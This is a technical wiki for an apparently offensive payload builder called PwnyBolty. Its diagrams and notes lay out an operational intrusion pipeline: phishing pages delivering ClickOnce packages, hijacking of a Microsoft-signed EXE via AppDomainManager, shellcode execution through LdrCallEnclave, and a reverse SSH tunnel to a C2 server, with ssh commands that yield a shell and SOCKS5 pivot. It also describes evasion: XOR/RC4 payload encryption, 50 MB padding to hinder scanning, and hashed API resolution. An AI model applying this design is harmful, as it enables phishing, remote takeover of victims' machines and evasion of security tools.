# PwnyBolty — Technical Wiki

---

## Architecture

```mermaid
flowchart TB
    Operator([Operator])

    subgraph Docker["Docker Container"]
        Caddy["Caddy\n(port 80)\n/static/ · /build/"]
        API["FastAPI\n(port 8000)\napp.py"]
        Builder["Builder / BoltholeBuilder\nmsbuild + Mono"]

        Caddy -- "/api/*" --> API
        API -- "BackgroundTask" --> Builder
    end

    subgraph Artifacts["build/id/"]
        ZIP["payload.zip"]
        Log["build.log"]
        OpKey["operator_key  ·Bolthole·"]
        Phish["phish.html  ·Bolthole·"]
        C2Sh["c2_setup.sh  ·Bolthole·"]
    end

    Operator -- "POST /api/build\nPOST /api/bolthole-build" --> Caddy
    Builder --> Artifacts
    Operator -- "downloads artifacts" --> Caddy
    Caddy --> Artifacts
```

---

## CFCO Build Flow

```mermaid
sequenceDiagram
    actor Operator
    participant API as FastAPI
    participant Builder as Builder
    participant Caddy as Caddy/Static
    participant Target as Target Machine

    Operator->>API: POST /api/build
    API-->>Operator: { buildid }
    API->>Builder: Spawn BackgroundTask

    Note over Builder: 1. Copy templates/src/<br/>2. Substitute HMAC-MD5 API hashes<br/>3. Generate Data.cs for inflation<br/>4. msbuild compile DLL<br/>5. Encrypt actions to config.json<br/>6. Package and zip artifacts

    Builder-->>Caddy: build/id/ ready

    Operator->>Target: Deliver phishing link
    Target->>Caddy: GET payload.application
    Caddy-->>Target: ClickOnce deployment manifest
    Target->>Caddy: Download .deploy files
    Caddy-->>Target: DLL + config.json + sideload EXE

    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager hijack loads DLL<br/>DLL decrypts and reads config.json

    alt run_code
        Target->>Target: Execute shellcode via LdrCallEnclave
    else run_cmd
        Target->>Target: Run OS command
    else drop_file
        Target->>Target: Write file to disk
    end
```

---

## Bolthole Build Flow

```mermaid
sequenceDiagram
    actor Operator
    participant API as FastAPI
    participant Builder as BoltholeBuilder
    participant Caddy as Caddy/Static
    participant C2 as C2 Server
    participant Target as Target Machine

    Operator->>API: POST /api/bolthole/c2 {ssh_host, ssh_user, ports}
    API-->>Operator: Global outbound keypair generated and stored

    Operator->>API: POST /api/bolthole-build
    API-->>Operator: { buildid }
    API->>Builder: Spawn BackgroundTask

    Note over Builder: Generate per-build ECDSA operator keypair<br/>Generate per-build RSA-2048 boltd host key<br/>Embed global outbound key as user_key<br/>msbuild compile Bolthole.dll<br/>Package BoltFiles: boltd · boltcon · libcrypto<br/>authorized_keys · boltd-config · user_key<br/>Generate phish.html + c2_setup.sh

    Builder-->>Caddy: build/id/ ready
    Caddy-->>Operator: ZIP · operator_key · phish.html · c2_setup.sh

    Operator->>C2: Run c2_setup.sh
    Note over C2: Creates SSH user (nologin)<br/>Adds outbound pubkey to authorized_keys<br/>Enables TCP forwarding + GatewayPorts<br/>Opens firewall ports (443, 80, 22, ...)

    Operator->>Target: Deliver phishing link (phish.html)
    Target->>Caddy: GET payload.application
    Caddy-->>Target: ClickOnce manifest + .deploy files

    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager loads Bolthole.dll<br/>Extract BoltFiles · start boltd · start boltcon

    Target->>C2: Reverse SSH tunnel (ports 443 → 80 → 22 → ...)
    Operator->>C2: ssh -i operator_key -p tunnel_port user@c2
    C2-->>Operator: Shell on Target + SOCKS5 pivot
```

---

## Bolthole Sequence

```mermaid
sequenceDiagram
    actor Operator
    participant UI as PwnyBolty UI
    participant API as FastAPI
    participant Builder as BoltholeBuilder
    participant C2 as C2 Server
    participant Target as Target Machine

    Operator->>UI: Configure C2 (ssh_host, ssh_user, ports)
    UI->>API: POST /api/bolthole/c2
    API-->>UI: Global outbound keypair generated and stored

    Operator->>C2: Run generated c2_setup.sh
    Note over C2: Creates restricted SSH user<br/>Adds outbound pubkey to authorized_keys<br/>Enables TCP forwarding and GatewayPorts<br/>Opens firewall ports (443, 80, 22, ...)

    Operator->>UI: Submit Bolthole build request
    UI->>API: POST /api/bolthole-build
    API->>Builder: Spawn BackgroundTask

    Note over Builder: 1. Generate per-build ECDSA operator keypair<br/>2. Generate per-build RSA-2048 boltd host key<br/>3. Embed global outbound key as user_key<br/>4. Template Program.cs (host, ports, delays)<br/>5. msbuild compile Bolthole.dll<br/>6. Package DLL + BoltFiles<br/>7. Write phish.html and c2_setup.sh

    Builder-->>Operator: build/id/ ready (ZIP, operator_key, phish.html, c2_setup.sh)

    Operator->>Target: Deliver phishing link (phish.html)
    Target->>C2: GET provider_url/payload.application
    C2-->>Target: ClickOnce deployment manifest
    Target->>C2: Download all .deploy files

    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager hijack loads Bolthole.dll<br/>DLL unpacks BoltFiles to temp dir<br/>Starts boltd (SSH daemon on 127.0.0.1:tunnel_port)<br/>Starts boltcon, tries ports 443 → 80 → 22 → ...

    Target->>C2: Reverse SSH tunnel established
    Note over C2: boltd reachable via tunnel_port (31332)<br/>SOCKS5 proxy bound on socks_port (1080)

    Operator->>C2: ssh -i operator_key -p 31332 user@c2
    C2-->>Operator: Interactive shell on Target
    Operator->>C2: ssh -D local_port (SOCKS5 pivot)
    C2-->>Operator: Full network access into Target environment
```

---

## Payload Encryption

Shellcode and dropped files are encrypted by `Mutator` before embedding. Each encrypted blob has the following binary layout:

```mermaid
flowchart LR
    A["**MD5**\n16 B"]
    B["**Type**\n4 B\nXOR=0 RC4=1"]
    C["**Key Size**\n4 B"]
    D["**Nonce Size**\n4 B"]
    E["**Payload Size**\n4 B"]
    F["**Key**\nvariable"]
    G["**Nonce**\nvariable"]
    H["**Encrypted Payload**\nvariable\nXOR or RC4"]

    A --- B --- C --- D --- E --- F --- G --- H
```

- **MD5** — integrity check of the plaintext payload before encryption
- **Type** — selects the decryption algorithm at runtime (`0` = XOR, `1` = RC4)
- **Key / Nonce** — random alphanumeric bytes, length chosen randomly between 16–32 bytes per build
- **Encrypted Payload** — XOR key-repeating or RC4 PRGA over the raw shellcode/file bytes
- **Inflation** — optionally padded to 50 MB with random noise + null bytes to further hinder scanning

API exports (`ntdll.dll`, `LdrCallEnclave`) are resolved at runtime using HMAC-MD5 hashes with a random 64-bit key baked in per-build, avoiding static import table entries.
